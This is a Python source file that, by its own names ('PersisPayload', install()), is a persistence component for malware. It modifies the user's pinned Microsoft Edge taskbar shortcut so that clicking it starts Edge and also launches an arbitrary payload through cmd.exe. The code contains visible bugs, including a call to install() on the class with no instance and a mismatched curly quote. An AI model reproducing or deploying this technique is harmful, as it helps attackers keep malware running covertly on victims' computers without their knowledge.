import os
import sys

if sys.platform == "win32":
    import win32com.client
else:
    win32com = None

class TaskbarShortcut:
    
    def __init__(self, payload: str) -> None:
        self.payload = payload
        
    def modify_edge_shortcuts(self):
        
        current_user = os.getlogin() #gets users loggin name
        
        edge_shortcut_path = r"C:\Users\{}\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\User Pinned\Taskbar\Microsoft Edge.lnk".format(current_user) #TODO: dynamically iterate through shortcut folder
        self.modify_shortcut(edge_shortcut_path)

    def modify_shortcut(self, shortcut_path):
                shell = win32com.client.Dispatch("WScript.Shell")
                shortcut = shell.CreateShortCut(shortcut_path)
                
                edge_path = shortcut.TargetPath
                PersisPayload = self.payload
                
                arguments = rf'%windir%\system32\cmd.exe “/c start msedge.exe & start {PersisPayload}'
                shortcut.Arguments = arguments
                shortcut.Save()
                print(f"Shortcut Modified: {shortcut_path}")
                print(arguments)


    def install(self):
        self.modify_edge_shortcuts()
        
if __name__ == "__main__":
    TaskbarShortcut.install()